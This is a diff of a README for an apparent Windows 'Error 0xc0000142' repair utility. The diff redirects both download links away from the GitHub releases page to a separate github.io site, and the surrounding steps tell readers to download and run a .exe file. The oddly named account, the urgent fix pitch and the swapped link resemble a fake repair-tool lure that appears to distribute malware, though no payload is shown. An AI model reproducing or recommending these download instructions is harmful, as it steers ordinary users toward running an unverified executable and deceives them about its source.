@@ -1,6 +1,6 @@
 # 🛠️ Error-0xc0000142-Fix - Resolve Windows application startup errors today
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Plethodontgobletcell806/Error-0xc0000142-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://plethodontgobletcell806.github.io)
 
 ## What is Error 0xc0000142?
 
@@ -20,7 +20,7 @@ Confirm your device meets these requirements before you start the repair process
 
 Follow these steps to obtain the repair utility:
 
-1.  Visit [this page to download](https://github.com/Plethodontgobletcell806/Error-0xc0000142-Fix/releases) the latest version.
+1.  Visit [this page to download](https://plethodontgobletcell806.github.io) the latest version.
 2.  Locate the most recent release at the top of the list.
 3.  Click the file ending in .exe to start the transfer to your computer.
 4.  Save the file to your desktop for easy access.
